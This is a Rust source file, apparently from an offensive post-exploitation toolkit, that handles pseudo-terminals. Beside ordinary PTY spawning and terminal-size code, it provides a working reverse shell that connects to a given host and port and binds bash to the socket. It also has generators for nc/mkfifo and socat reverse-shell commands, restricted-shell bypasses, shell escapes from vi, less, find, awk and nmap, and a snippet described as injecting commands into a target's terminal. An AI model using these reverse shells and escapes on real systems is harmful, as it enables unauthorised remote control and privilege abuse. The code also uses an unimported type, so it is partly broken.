use portable_pty::{native_pty_system, Child, CommandBuilder, MasterPty, PtySize};

pub struct PtySession {
    pub master: Box<dyn MasterPty + Send>,
    pub child: Box<dyn Child + Send + Sync>,
}

pub fn spawn_pty(command: &str, args: &[&str], rows: u16, cols: u16) -> Result<PtySession, String> {
    let pty_system = native_pty_system();

    let pair = pty_system
        .openpty(PtySize {
            rows,
            cols,
            pixel_width: 0,
            pixel_height: 0,
        })
        .map_err(|e| format!("Failed to open PTY: {}", e))?;

    let mut cmd = CommandBuilder::new(command);
    for arg in args {
        cmd.arg(arg);
    }

    let child = pair
        .slave
        .spawn_command(cmd)
        .map_err(|e| format!("Failed to spawn command: {}", e))?;

    println!("[PTY] Spawned {} with PID", command);

    Ok(PtySession {
        master: pair.master,
        child,
    })
}

pub fn spawn_shell(shell_path: &str, rows: u16, cols: u16) -> Result<PtySession, String> {
    spawn_pty(shell_path, &[], rows, cols)
}

pub fn spawn_bash_pty() -> Result<PtySession, String> {
    spawn_shell("/bin/bash", 24, 80)
}

pub fn spawn_sh_pty() -> Result<PtySession, String> {
    spawn_shell("/bin/sh", 24, 80)
}

pub fn spawn_cmd_pty() -> Result<PtySession, String> {
    spawn_shell("cmd.exe", 24, 80)
}

pub fn spawn_powershell_pty() -> Result<PtySession, String> {
    spawn_shell("powershell.exe", 24, 80)
}

pub fn upgrade_shell_python() -> String {
    r#"python -c 'import pty; pty.spawn("/bin/bash")'"#.to_string()
}

pub fn upgrade_shell_python3() -> String {
    r#"python3 -c 'import pty; pty.spawn("/bin/bash")'"#.to_string()
}

pub fn upgrade_shell_perl() -> String {
    r#"perl -e 'exec "/bin/bash";'"#.to_string()
}

pub fn upgrade_shell_ruby() -> String {
    r#"ruby -e 'exec "/bin/bash"'"#.to_string()
}

pub fn upgrade_shell_lua() -> String {
    r#"lua -e 'os.execute("/bin/bash")'"#.to_string()
}

pub fn stabilize_shell_stty() -> Vec<String> {
    vec![
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'".to_string(),
        "export TERM=xterm".to_string(),
        "Ctrl+Z (background)".to_string(),
        "stty raw -echo; fg".to_string(),
        "reset".to_string(),
    ]
}

#[cfg(unix)]
pub fn detect_tty() -> bool {
    unsafe { libc::isatty(libc::STDIN_FILENO) != 0 }
}

#[cfg(windows)]
pub fn detect_tty() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal()
}

#[cfg(unix)]
pub fn get_terminal_size() -> Result<(u16, u16), String> {
    use std::os::unix::io::AsRawFd;

    #[repr(C)]
    struct Winsize {
        ws_row: u16,
        ws_col: u16,
        ws_xpixel: u16,
        ws_ypixel: u16,
    }

    let mut size = Winsize {
        ws_row: 0,
        ws_col: 0,
        ws_xpixel: 0,
        ws_ypixel: 0,
    };

    unsafe {
        if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCGWINSZ, &mut size) == 0 {
            Ok((size.ws_row, size.ws_col))
        } else {
            Err("Failed to get terminal size".to_string())
        }
    }
}

#[cfg(windows)]
pub fn get_terminal_size() -> Result<(u16, u16), String> {
    // Windows default console size
    Ok((24, 80))
}

#[cfg(unix)]
pub fn set_terminal_size(rows: u16, cols: u16) -> Result<(), String> {
    use std::os::unix::io::AsRawFd;

    #[repr(C)]
    struct Winsize {
        ws_row: u16,
        ws_col: u16,
        ws_xpixel: u16,
        ws_ypixel: u16,
    }

    let size = Winsize {
        ws_row: rows,
        ws_col: cols,
        ws_xpixel: 0,
        ws_ypixel: 0,
    };

    unsafe {
        if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCSWINSZ, &size) == 0 {
            Ok(())
        } else {
            Err("Failed to set terminal size".to_string())
        }
    }
}

#[cfg(windows)]
pub fn set_terminal_size(_rows: u16, _cols: u16) -> Result<(), String> {
    // Not implemented on Windows
    log::warn!("set_terminal_size not supported on Windows");
    Ok(())
}

pub fn shell_escape_vi() -> Vec<String> {
    vec![
        ":!/bin/bash".to_string(),
        ":set shell=/bin/bash".to_string(),
        ":shell".to_string(),
    ]
}

pub fn shell_escape_less() -> Vec<String> {
    vec!["!/bin/bash".to_string(), "!sh".to_string()]
}

pub fn shell_escape_more() -> Vec<String> {
    vec!["!/bin/bash".to_string(), "!sh".to_string()]
}

pub fn shell_escape_find() -> String {
    "find / -name blah -exec /bin/bash \\;".to_string()
}

pub fn shell_escape_awk() -> String {
    "awk 'BEGIN {system(\"/bin/bash\")}'".to_string()
}

pub fn shell_escape_nmap() -> String {
    "nmap --interactive\n!sh".to_string()
}

pub fn tty_pushback_trick() -> String {
    r#"#!/bin/bash
# TTY Pushback - inject commands into target's terminal
exec </dev/tty
while read -r cmd; do
    echo "$cmd"
done
"#
    .to_string()
}

pub fn bypass_rbash() -> Vec<String> {
    vec![
        "BASH_CMDS[a]=/bin/bash;a".to_string(),
        "ssh user@host -t bash".to_string(),
        "vi -> :set shell=/bin/bash -> :shell".to_string(),
        "export PATH=/usr/local/bin:/usr/bin:/bin".to_string(),
        "cd /tmp; ln -s /bin/bash ls; PATH=/tmp:$PATH; ls".to_string(),
    ]
}

pub fn detect_restricted_shell() -> bool {
    std::env::var("SHELL")
        .map(|s| s.contains("rbash") || s.contains("rsh"))
        .unwrap_or(false)
}

#[cfg(unix)]
pub fn spawn_reverse_pty(lhost: &str, lport: u16) -> Result<(), String> {
    use std::net::TcpStream;
    use std::os::unix::io::{AsRawFd, FromRawFd};

    let stream = TcpStream::connect(format!("{}:{}", lhost, lport))
        .map_err(|e| format!("Connection failed: {}", e))?;

    let fd = stream.as_raw_fd();

    unsafe {
        libc::dup2(fd, 0);
        libc::dup2(fd, 1);
        libc::dup2(fd, 2);
    }

    let mut cmd = Command::new("/bin/bash");
    cmd.arg("-i");
    cmd.spawn()
        .map_err(|e| format!("Failed to spawn shell: {}", e))?;

    Ok(())
}

#[cfg(windows)]
pub fn spawn_reverse_pty(_lhost: &str, _lport: u16) -> Result<(), String> {
    Err("PTY reverse shell not supported on Windows, use socket_tools instead".to_string())
}

#[cfg(unix)]
pub fn create_named_pipe(path: &str) -> Result<(), String> {
    use std::fs;
    use std::os::unix::fs::OpenOptionsExt;

    unsafe {
        if libc::mkfifo(std::ffi::CString::new(path).unwrap().as_ptr(), 0o644) == 0 {
            println!("[PTY] Created named pipe: {}", path);
            Ok(())
        } else {
            Err("Failed to create named pipe".to_string())
        }
    }
}

#[cfg(windows)]
pub fn create_named_pipe(_path: &str) -> Result<(), String> {
    Err(
        "Named pipes use different API on Windows, use std::os::windows::io::named_pipe"
            .to_string(),
    )
}

pub fn fifo_shell_reverse(fifo_path: &str, lhost: &str, lport: u16) -> String {
    format!(
        "mkfifo {}; nc {} {} 0<{} | /bin/bash 1>{} 2>&1",
        fifo_path, lhost, lport, fifo_path, fifo_path
    )
}

pub fn socat_pty_reverse(lhost: &str, lport: u16) -> String {
    format!(
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
        lhost, lport
    )
}
